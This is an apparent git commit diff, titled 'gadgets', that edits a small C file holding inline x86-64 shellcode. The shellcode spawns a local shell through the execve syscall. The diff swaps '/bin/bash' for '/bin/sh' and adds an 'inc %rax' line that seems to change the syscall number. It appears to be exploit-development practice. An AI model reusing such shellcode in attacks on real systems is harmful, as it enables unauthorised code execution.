fd4978ef63ab7ffbf49cca932caebd14b0501a30
JerryMouseZ <1711333@mail.nankai.edu.cn>
2020-12-31 09:11:06 +0800

    gadgets

--- cshell/shellbin.c
+++ cshell/shellbin.c
@@ -3,10 +3,11 @@ int main() {
 needle0: jmp there\n\
 here:    pop %rdi\n\
          mov $0x3b, %rax\n\
+		 inc %rax\n\
          mov $0, %rsi\n\
          mov $0, %rdx\n\
          syscall\n\
 there:   call here\n\
-.string \"/bin/bash\"\n\
+.string \"/bin/sh\"\n\
   ");
 }
